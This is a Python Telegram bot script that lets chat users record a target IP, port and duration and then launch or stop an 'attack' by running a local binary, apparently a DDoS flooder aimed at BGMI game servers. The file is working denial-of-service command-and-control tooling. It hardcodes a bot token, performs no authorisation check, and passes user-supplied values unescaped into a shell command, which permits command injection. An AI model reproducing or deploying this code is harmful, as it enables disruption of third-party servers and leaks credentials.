import telebot
import logging
import time
from subprocess import Popen, PIPE
from threading import Thread
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Initialize asyncio event loop
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

TOKEN = '7031476424:AAG6bW4N65VCpxyOgdjiWQ6FYbVnGal2uXY'
CHANNEL_ID = -1002161930825

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

# Global variables to store attack details
attack_details = {}
attack_process = None

async def run_attack_command_async(target_ip, target_port, duration):
    global attack_process
    # Start the bgmi process
    attack_process = await asyncio.create_subprocess_shell(
        f"./FUCK {target_ip} {target_port} {duration}",
        stdout=PIPE, stderr=PIPE
    )
    await attack_process.communicate()
    
    # Notify that the attack has ended
    bot.send_message(CHANNEL_ID, f"*Attack ended 🛑\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')

def stop_attack():
    global attack_process
    if attack_process:
        attack_process.terminate()
        attack_process.kill()
        attack_process = None

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    btn1 = KeyboardButton("Record 📝")
    btn2 = KeyboardButton("Start Attack 💥")
    btn3 = KeyboardButton("Stop Attack ✋")
    markup.add(btn1, btn2, btn3)
    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "Record 📝":
        bot.send_message(message.chat.id, "*Enter the target IP, port, and duration (in seconds) separated by spaces:*", parse_mode='Markdown')
        bot.register_next_step_handler(message, record_attack_details)

    elif message.text == "Start Attack 💥":
        if 'ip' in attack_details and 'port' in attack_details and 'duration' in attack_details:
            # Send immediate message before starting the attack
            bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {attack_details['ip']}\nPort: {attack_details['port']}\nTime: {attack_details['duration']}*", parse_mode='Markdown')
            asyncio.run_coroutine_threadsafe(run_attack_command_async(attack_details['ip'], attack_details['port'], attack_details['duration']), loop)
        else:
            bot.send_message(message.chat.id, "*Please record attack details first using the 'Record 📝' button.*", parse_mode='Markdown')

    elif message.text == "Stop Attack ✋":
        stop_attack()
        bot.send_message(message.chat.id, "*Attack stopped successfully.*", parse_mode='Markdown')

def record_attack_details(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        attack_details['ip'] = target_ip
        attack_details['port'] = target_port
        attack_details['duration'] = duration

        bot.send_message(message.chat.id, f"*Attack details recorded 💾\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error in recording attack details: {e}")
        bot.send_message(message.chat.id, "*An error occurred while recording attack details. Please try again.*", parse_mode='Markdown')

if __name__ == "__main__":
    # Start the asyncio event loop in a separate thread
    def start_asyncio_thread():
        loop.run_forever()

    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
